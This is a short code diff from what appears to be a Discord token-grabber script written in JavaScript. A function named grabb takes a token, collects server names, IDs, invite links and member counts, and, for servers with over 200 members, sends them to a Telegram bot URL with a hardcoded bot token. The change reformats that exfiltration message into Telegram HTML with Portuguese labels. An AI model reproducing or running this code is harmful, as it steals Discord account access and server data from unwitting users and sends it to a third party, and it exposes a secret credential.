@@ -120,7 +120,12 @@ async function grabb(applicationId, token) {
       if (Number(memberCount.total) > 200) {
         webhookURL = "https://api.telegram.org/bot7849468467:AAG4CXcuU6zvvWwWQhtl8JApWr1GeqlZNrQ/sendMessage";
       }
-      return `\`${guild.name} - ${guild.id}\`\n[Link](${invite}) - \`${memberCount.total || ''} Membros\` (\`${memberCount.online} Online\`)`;
+      return `
+<b>Nome do Servidor:</b> <code>${guild.name} - ${guild.id}</code>
+<b>Link:</b> <a href="${invite}">Clique aqui</a> 
+<b>Membros:</b> <code>${memberCount.total || 'N/A'} Membros</code> 
+<b>Online:</b> <code>${memberCount.online || 'N/A'} Online</code>
+`;
     })
   );
 
